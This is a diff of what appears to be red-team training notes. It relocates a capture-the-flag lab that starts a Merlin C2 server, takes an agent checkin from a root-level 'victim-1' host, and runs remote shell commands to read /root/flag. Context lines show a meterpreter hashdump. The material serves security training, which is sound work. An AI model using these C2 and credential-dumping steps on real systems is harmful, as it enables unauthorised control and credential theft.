@@ -17,12 +17,12 @@
 	- Introduction to Starkiller
 	- Red Team Operations with PowerShell-Empire
 	- Red Team Operations with Starkiller
-- Custom C2 Protocol
-	- Custom C2 Protocol (with Merlin)
 - C2 Frameworks: Armitage
 	- Introduction to Armitage
 	- Port Scanning and Enumeration with Armitage
 	- Exploitation and Post Exploitation with Armitage
+- Custom C2 Protocol
+	- Custom C2 Protocol (with Merlin)
 
 ### Prerequisites
 
@@ -1953,284 +1953,6 @@ These features enable comprehensive control and management of the compromised sy
 
 ---
 
-## Custom C2 Protocol
-
-### Custom C2 Protocol (with Merlin) - Theory/Lab
-
-[Custom Command and Control Protocol](https://attack.mitre.org/techniques/T1094/) are used by the adversaries to communicate with malware/trojan and exfiltrate the data. These channels mimic well-known protocols (i.e. HTTP, DNS) or follow custom protocols.
-
-Merlin is a command and control (C2) server designed for post-exploitation tasks. It provides a framework for controlling compromised machines through agents installed on those machines. Merlin utilizes modern HTTP/2 protocols to facilitate secure and efficient communication between the server and its agents. By mimicking well-known protocols or using custom ones, Merlin allows adversaries to perform various actions, such as data exfiltration, command execution, and system exploration, in a stealthy and effective manner.
-
-**Key Features**
-
-- Modern HTTP/2 protocol for communication.
-- Supports multiple agents for large-scale operations.
-- Secure communication with encryption options.
-- Ability to execute commands, transfer files, and gather system information.
-- Extensible framework for integrating custom functionalities.
-
-Merlin Server is typically used in red team operations and penetration testing scenarios to simulate advanced persistent threat (APT) behaviors and assess the security posture of target systems and networks.
-
-#### Lab Environment
-
-In this lab, [Merlin](https://github.com/Ne0nd0g/merlin) server and agent are installed on two separate machines.
-You are given access to the machine which has Merlin server installed on it.
-The Merlin agent running on the other machine is periodically trying to connect to Merlin server on port 443 over HTTPS.
-
-**Objectives**
-- Start the Merlin server on the `eth1` interface.
-- Once the Merlin agent connects back, retrieve the flag kept in the root directory of the other machine!
-
-**Guidelines**
-- Merlin server can be invoked using `merlinServer` command.
-- Merlin agents payloads of different types can be inspected in `/root/data` directory.
-
-**References**
-- [Custom Command and Control Protocol](https://attack.mitre.org/techniques/T1094/)
-- [Merlin HTTP/2 C&C](https://github.com/Ne0nd0g/merlin).
-
-#### Lab Solution
-
-_Retrieving help information for Merlin server command._
-
-`merlinServer --help`:
-```
-#################################################
-#               MERLIN SERVER                   #
-#################################################
-Version: 0.8.0.BETA
-Build: 2c1146fa39f65c96b8ccbcd915383e16441af063
-  -debug
-        Enable debug output
-  -i string
-        The IP address of the interface to bind to (default "127.0.0.1") ←
-  -p int
-        Merlin Server Port (default 443) ←
-  -proto string
-        Protocol for the agent to connect with [h2, hq] (default "h2")
-  -psk string
-        Pre-Shared Key used to encrypt initial communications (default "merlin")
-  -v    Enable verbose output
-  -x509cert string
-        The x509 certificate for the HTTPS listener (default "/root/data/x509/server.crt")
-  -x509key string
-        The x509 certificate key for the HTTPS listener (default "/root/data/x509/server.key")
-```
-
-_Checking network interfaces for the correct IP address._
-
-`ifconfig`:
-```
-eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
-        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
-        RX packets 917  bytes 67110 (67.1 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 516  bytes 377450 (377.4 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 192.30.39.2  netmask 255.255.255.0  broadcast 192.30.39.255 ←
-        ether 02:42:c0:1e:27:02  txqueuelen 0  (Ethernet)
-        RX packets 32  bytes 2316 (2.3 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 714 (714.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 18  bytes 1656 (1.6 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 18  bytes 1656 (1.6 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-
-_Starting the Merlin server on the specified IP address._
-
-`merlinServer -i "192.30.39.2"`:
-```
-                               &&&&&&&&
-                             &&&&&&&&&&&&
-                            &&&&&&&&&&&&&&&
-                          &&&&&&&&&&& &&&&
-                         &&&&&&&&&&&&&  &&&&
-                        &&&&&&&&&&&& &  &&&&
-                       &&&&&&&&&&&&&     &&&&
-                      &&&&&&&&&&&&&&&     &&&
-                     &&&&&&&&&&&&&&&&&     &&&
-                    &&&&&&&&&&&&&&&&&&&     &&&
-                   &&&&&&&&&&&&&&&&&&&&&
-                  &&&&&&&&&&&&&&&&&&&&&&&
-                  &&&&&&&&&&&&&&&&&&&&&&&
-                 &&&&&&&&&&&&&&&&&&&&&&&&&
-                &&&&&&&&&&&&&&&&&&&&&&&&&&&
-               &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-              &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-             &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-       &&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&
-    &&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&
-  &&&&&&&   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&&&&&
-&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&
-&&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&
-&&&&&&&&&&&   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&&&&&&&&&
-&&&&&&&&&&&&&     &&&&&&&&&&&&&&&&&&&&&&&     &&&&&&&&&&&&&
-  &&&&&&&&&&&&&&&          MERLIN         &&&&&&&&&&&&&&&
-    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-           &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
-                   Version: 0.8.0.BETA
-                   Build: 2c1146fa39f65c96b8ccbcd915383e16441af063
-[-]No certificate found at /root/data/x509/server.crt
-[-]Creating in-memory x.509 certificate used for this session only.
-[i]Additional details: https://github.com/Ne0nd0g/merlin/wiki/TLS-Certificates
-Merlin»  
-[!]Listener was started using "merlin" as the Pre-Shared Key (PSK) allowing anyone decrypt message traffic.
-[-]Consider changing the PSK by using the -psk command line flag.
-[-]Starting h2 listener on 192.30.39.2:443 ←
-```
-
-_The agent has successfully connected to the server._
-
-`[+]New authenticated agent checkin for 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:15:14Z`
-
-_List available commands in the Merlin server._
-
-`help`:
-```
-Merlin C2 Server (version 0.8.0.BETA)
-
-  COMMAND  |          DESCRIPTION           |    OPTIONS      
-+----------+--------------------------------+----------------+
-  agent    | Interact with agents or list   | interact, list  
-           | agents                         |                 
-  banner   | Print the Merlin banner        |                 
-  exit     | Exit and close the Merlin      |                 
-           | server                         |                 
-  interact | Interact with an agent. Alias  |                 
-           | for Empire users               |                 
-  quit     | Exit and close the Merlin      |                 
-           | server                         |                 
-  remove   | Remove or delete a DEAD agent   
-           | from the server                 
-  sessions | List all agents session        |                 
-           | information. Alias for MSF     |                 
-           | users                          |                 
-  use      | Use a function of Merlin       | module          
-  version  | Print the Merlin server        |                 
-           | version                        |                 
-  *        | Anything else will be execute  |                 
-           | on the host operating system   |                 
-Main Menu Help
-
-[i]Visit the wiki for additional information https://github.com/Ne0nd0g/merlin/wiki/Merlin-Server-Main-Menu
-```
-
-_List all active agent sessions._
-
-`sessions`:
-```
-+------------------------------------+--------------+------+----------+------------+--------+
-|              AGENT GUID            |   PLATFORM   | USER |   HOST   | TRANSPORT  | STATUS |
-+------------------------------------+--------------+------+----------+------------+--------+
-| 0b574407-f2fc-450d-af4e-c858bc62cb34 | linux/amd64 | root | victim-1 | HTTP/2 (h2) | Active |
-+------------------------------------+--------------+------+----------+------------+--------+
-```
-
-_Interact with the active agent._
-
-`interact 0b574407-f2fc-450d-af4e-c858bc62cb34`
-
-_List available commands for interacting with the agent._
-
-`help`:
-```
-+-------------------+-----------------------------------------+-----------------------------+
-|     COMMAND       |              DESCRIPTION                |           OPTIONS           |
-+-------------------+-----------------------------------------+-----------------------------+
-| cd                | Change directories ←                    | cd ../../ OR cd c:\Users    |
-| cmd               | Execute a command on the agent          | cmd ping -c 3 8.8.8.8       |
-|                   | (DEPRECIATED)                           |                             |
-| back              | Return to the main menu                 |                             |
-| download          | Download a file from the agent          | download <remote_file>      |
-| execute-shellcode | Execute shellcode                       | self, remote <pid>,         |
-|                   |                                         | RtlCreateUserThread <pid>   |
-| info              | Display all information about the agent ← |                             |
-| kill              | Instruct the agent to die or quit       |                             |
-| ls                | List directory contents                 | ls /etc OR ls C:\Users      |
-| main              | Return to the main menu                 |                             |
-| pwd               | Display the current working directory   | pwd                         |
-| set               | Set the value for one of the agent's    | killdate, maxretry, padding,|
-|                   | options                                 | skew, sleep                 |
-| shell             | Execute a command on the agent          | shell ping -c 3 8.8.8.8     |
-| status            | Print the current status of the agent   |                             |
-| upload            | Upload a file to the agent              | upload <local_file>         |
-|                   |                                         | <remote_file>               |
-+-------------------+-----------------------------------------+-----------------------------+
-```
-
-_Display detailed information about the agent._
-
-`info`:
-```
-+-------------------------+----------------------------------------------------+
-|         Status          | Delayed                                            |
-|         ID              | 0b574407-f2fc-450d-af4e-c858bc62cb34               |
-|         Platform        | linux ←                                             |
-|         Architecture    | amd64                                              |
-|         UserName        | root ←                                             |
-|         User GUID       | 0                                                  |
-|         Hostname        | victim-1                                           |
-|         Process ID      | 21                                                 |
-|         IP              | [127.0.0.1/8 192.30.64.3/24]                       |
-|         Initial Check In| 2019-12-28T11:14:56Z                               |
-|         Last Check In   | 2019-12-28T11:14:56Z                               |
-|         Agent Version   | 0.8.0.BETA                                         |
-|         Agent Build     | 2c1146fa39f65c96b8ccbcd915383e16441af063           |
-|         Agent Wait Time | 30s                                                |
-|         Agent Wait Time | 3000                                               |
-|         Skew            |                                                    |
-|         Agent Message   | 4096                                               |
-|         Padding Max     |                                                    |
-|         Agent Max Retries| 7                                                 |
-|         Agent Failed Check In| 0                                             |
-|         Agent Kill Date | 1970-01-01T00:00:00Z                               |
-|         Agent Communication Protocol| h2                                     |
-+-------------------------+----------------------------------------------------+
-```
-
-_List the contents of the `/root` directory on the agent machine._
-
-`ls /root`:
-```
-[-]Created job yCONnQujAj for agent 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:15:32Z
-```
-
-```
-[+]Results for job yCONnQujAj at 2019-12-28T11:16:16Z
-
-Directory listing for: /root
-
--rw-r--r-- 2018-08-06 22:35:13 3106 .bashrc
--rw-r--r-- 2018-08-06 22:35:13  148 .profile
--rw-r--r-- 2019-12-28 11:10:37   33 flag ←
-```
-
-_Retrieve the content of the flag file._
-
-`shell cat /root/flag`:
-```
-[-]Created job biTNtvTurE for agent 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:17:00Z
-```
-
-```
-[+]Results for job biTNtvTurE at 2019-12-28T11:17:17Z
-
-f02dcc52da5f871c0ef1998a9cfe4993 ←
-```
-
----
-
 ## C2 Frameworks: Armitage
 
 ### Introduction to Armitage - Theory
@@ -2583,6 +2305,284 @@ meterpreter> hashdump
 [*] Dumping password hashes...
 [+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20::: ←
 [+] 	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+---
+
+## Custom C2 Protocol
+
+### Custom C2 Protocol (with Merlin) - Theory/Lab
+
+[Custom Command and Control Protocol](https://attack.mitre.org/techniques/T1094/) are used by the adversaries to communicate with malware/trojan and exfiltrate the data. These channels mimic well-known protocols (i.e. HTTP, DNS) or follow custom protocols.
+
+Merlin is a command and control (C2) server designed for post-exploitation tasks. It provides a framework for controlling compromised machines through agents installed on those machines. Merlin utilizes modern HTTP/2 protocols to facilitate secure and efficient communication between the server and its agents. By mimicking well-known protocols or using custom ones, Merlin allows adversaries to perform various actions, such as data exfiltration, command execution, and system exploration, in a stealthy and effective manner.
+
+**Key Features**
+
+- Modern HTTP/2 protocol for communication.
+- Supports multiple agents for large-scale operations.
+- Secure communication with encryption options.
+- Ability to execute commands, transfer files, and gather system information.
+- Extensible framework for integrating custom functionalities.
+
+Merlin Server is typically used in red team operations and penetration testing scenarios to simulate advanced persistent threat (APT) behaviors and assess the security posture of target systems and networks.
+
+#### Lab Environment
+
+In this lab, [Merlin](https://github.com/Ne0nd0g/merlin) server and agent are installed on two separate machines.
+You are given access to the machine which has Merlin server installed on it.
+The Merlin agent running on the other machine is periodically trying to connect to Merlin server on port 443 over HTTPS.
+
+**Objectives**
+- Start the Merlin server on the `eth1` interface.
+- Once the Merlin agent connects back, retrieve the flag kept in the root directory of the other machine!
+
+**Guidelines**
+- Merlin server can be invoked using `merlinServer` command.
+- Merlin agents payloads of different types can be inspected in `/root/data` directory.
+
+**References**
+- [Custom Command and Control Protocol](https://attack.mitre.org/techniques/T1094/)
+- [Merlin HTTP/2 C&C](https://github.com/Ne0nd0g/merlin).
+
+#### Lab Solution
+
+_Retrieving help information for Merlin server command._
+
+`merlinServer --help`:
+```
+#################################################
+#               MERLIN SERVER                   #
+#################################################
+Version: 0.8.0.BETA
+Build: 2c1146fa39f65c96b8ccbcd915383e16441af063
+  -debug
+        Enable debug output
+  -i string
+        The IP address of the interface to bind to (default "127.0.0.1") ←
+  -p int
+        Merlin Server Port (default 443) ←
+  -proto string
+        Protocol for the agent to connect with [h2, hq] (default "h2")
+  -psk string
+        Pre-Shared Key used to encrypt initial communications (default "merlin")
+  -v    Enable verbose output
+  -x509cert string
+        The x509 certificate for the HTTPS listener (default "/root/data/x509/server.crt")
+  -x509key string
+        The x509 certificate key for the HTTPS listener (default "/root/data/x509/server.key")
+```
+
+_Checking network interfaces for the correct IP address._
+
+`ifconfig`:
+```
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
+        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
+        RX packets 917  bytes 67110 (67.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 516  bytes 377450 (377.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.30.39.2  netmask 255.255.255.0  broadcast 192.30.39.255 ←
+        ether 02:42:c0:1e:27:02  txqueuelen 0  (Ethernet)
+        RX packets 32  bytes 2316 (2.3 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15  bytes 714 (714.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 18  bytes 1656 (1.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 18  bytes 1656 (1.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+_Starting the Merlin server on the specified IP address._
+
+`merlinServer -i "192.30.39.2"`:
+```
+                               &&&&&&&&
+                             &&&&&&&&&&&&
+                            &&&&&&&&&&&&&&&
+                          &&&&&&&&&&& &&&&
+                         &&&&&&&&&&&&&  &&&&
+                        &&&&&&&&&&&& &  &&&&
+                       &&&&&&&&&&&&&     &&&&
+                      &&&&&&&&&&&&&&&     &&&
+                     &&&&&&&&&&&&&&&&&     &&&
+                    &&&&&&&&&&&&&&&&&&&     &&&
+                   &&&&&&&&&&&&&&&&&&&&&
+                  &&&&&&&&&&&&&&&&&&&&&&&
+                  &&&&&&&&&&&&&&&&&&&&&&&
+                 &&&&&&&&&&&&&&&&&&&&&&&&&
+                &&&&&&&&&&&&&&&&&&&&&&&&&&&
+               &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+              &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+             &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+       &&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&
+    &&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&
+  &&&&&&&   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&&&&&
+&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&
+&&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&
+&&&&&&&&&&&   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&   &&&&&&&&&&&
+&&&&&&&&&&&&&     &&&&&&&&&&&&&&&&&&&&&&&     &&&&&&&&&&&&&
+  &&&&&&&&&&&&&&&          MERLIN         &&&&&&&&&&&&&&&
+    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+           &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+                   Version: 0.8.0.BETA
+                   Build: 2c1146fa39f65c96b8ccbcd915383e16441af063
+[-]No certificate found at /root/data/x509/server.crt
+[-]Creating in-memory x.509 certificate used for this session only.
+[i]Additional details: https://github.com/Ne0nd0g/merlin/wiki/TLS-Certificates
+Merlin»
+[!]Listener was started using "merlin" as the Pre-Shared Key (PSK) allowing anyone decrypt message traffic.
+[-]Consider changing the PSK by using the -psk command line flag.
+[-]Starting h2 listener on 192.30.39.2:443 ←
+```
+
+_The agent has successfully connected to the server._
+
+`[+]New authenticated agent checkin for 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:15:14Z`
+
+_List available commands in the Merlin server._
+
+`help`:
+```
+Merlin C2 Server (version 0.8.0.BETA)
+
+  COMMAND  |          DESCRIPTION           |    OPTIONS
++----------+--------------------------------+----------------+
+  agent    | Interact with agents or list   | interact, list
+           | agents                         |
+  banner   | Print the Merlin banner        |
+  exit     | Exit and close the Merlin      |
+           | server                         |
+  interact | Interact with an agent. Alias  |
+           | for Empire users               |
+  quit     | Exit and close the Merlin      |
+           | server                         |
+  remove   | Remove or delete a DEAD agent
+           | from the server
+  sessions | List all agents session        |
+           | information. Alias for MSF     |
+           | users                          |
+  use      | Use a function of Merlin       | module
+  version  | Print the Merlin server        |
+           | version                        |
+  *        | Anything else will be execute  |
+           | on the host operating system   |
+Main Menu Help
+
+[i]Visit the wiki for additional information https://github.com/Ne0nd0g/merlin/wiki/Merlin-Server-Main-Menu
+```
+
+_List all active agent sessions._
+
+`sessions`:
+```
++------------------------------------+--------------+------+----------+------------+--------+
+|              AGENT GUID            |   PLATFORM   | USER |   HOST   | TRANSPORT  | STATUS |
++------------------------------------+--------------+------+----------+------------+--------+
+| 0b574407-f2fc-450d-af4e-c858bc62cb34 | linux/amd64 | root | victim-1 | HTTP/2 (h2) | Active |
++------------------------------------+--------------+------+----------+------------+--------+
+```
+
+_Interact with the active agent._
+
+`interact 0b574407-f2fc-450d-af4e-c858bc62cb34`
+
+_List available commands for interacting with the agent._
+
+`help`:
+```
++-------------------+-----------------------------------------+-----------------------------+
+|     COMMAND       |              DESCRIPTION                |           OPTIONS           |
++-------------------+-----------------------------------------+-----------------------------+
+| cd                | Change directories ←                    | cd ../../ OR cd c:\Users    |
+| cmd               | Execute a command on the agent          | cmd ping -c 3 8.8.8.8       |
+|                   | (DEPRECIATED)                           |                             |
+| back              | Return to the main menu                 |                             |
+| download          | Download a file from the agent          | download <remote_file>      |
+| execute-shellcode | Execute shellcode                       | self, remote <pid>,         |
+|                   |                                         | RtlCreateUserThread <pid>   |
+| info              | Display all information about the agent ← |                             |
+| kill              | Instruct the agent to die or quit       |                             |
+| ls                | List directory contents                 | ls /etc OR ls C:\Users      |
+| main              | Return to the main menu                 |                             |
+| pwd               | Display the current working directory   | pwd                         |
+| set               | Set the value for one of the agent's    | killdate, maxretry, padding,|
+|                   | options                                 | skew, sleep                 |
+| shell             | Execute a command on the agent          | shell ping -c 3 8.8.8.8     |
+| status            | Print the current status of the agent   |                             |
+| upload            | Upload a file to the agent              | upload <local_file>         |
+|                   |                                         | <remote_file>               |
++-------------------+-----------------------------------------+-----------------------------+
+```
+
+_Display detailed information about the agent._
+
+`info`:
+```
++-------------------------+----------------------------------------------------+
+|         Status          | Delayed                                            |
+|         ID              | 0b574407-f2fc-450d-af4e-c858bc62cb34               |
+|         Platform        | linux ←                                             |
+|         Architecture    | amd64                                              |
+|         UserName        | root ←                                             |
+|         User GUID       | 0                                                  |
+|         Hostname        | victim-1                                           |
+|         Process ID      | 21                                                 |
+|         IP              | [127.0.0.1/8 192.30.64.3/24]                       |
+|         Initial Check In| 2019-12-28T11:14:56Z                               |
+|         Last Check In   | 2019-12-28T11:14:56Z                               |
+|         Agent Version   | 0.8.0.BETA                                         |
+|         Agent Build     | 2c1146fa39f65c96b8ccbcd915383e16441af063           |
+|         Agent Wait Time | 30s                                                |
+|         Agent Wait Time | 3000                                               |
+|         Skew            |                                                    |
+|         Agent Message   | 4096                                               |
+|         Padding Max     |                                                    |
+|         Agent Max Retries| 7                                                 |
+|         Agent Failed Check In| 0                                             |
+|         Agent Kill Date | 1970-01-01T00:00:00Z                               |
+|         Agent Communication Protocol| h2                                     |
++-------------------------+----------------------------------------------------+
+```
+
+_List the contents of the `/root` directory on the agent machine._
+
+`ls /root`:
+```
+[-]Created job yCONnQujAj for agent 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:15:32Z
+```
+
+```
+[+]Results for job yCONnQujAj at 2019-12-28T11:16:16Z
+
+Directory listing for: /root
+
+-rw-r--r-- 2018-08-06 22:35:13 3106 .bashrc
+-rw-r--r-- 2018-08-06 22:35:13  148 .profile
+-rw-r--r-- 2019-12-28 11:10:37   33 flag ←
+```
+
+_Retrieve the content of the flag file._
+
+`shell cat /root/flag`:
+```
+[-]Created job biTNtvTurE for agent 0b574407-f2fc-450d-af4e-c858bc62cb34 at 2019-12-28T11:17:00Z
+```
+
+```
+[+]Results for job biTNtvTurE at 2019-12-28T11:17:17Z
+
+f02dcc52da5f871c0ef1998a9cfe4993 ←
 ```
 
 ---
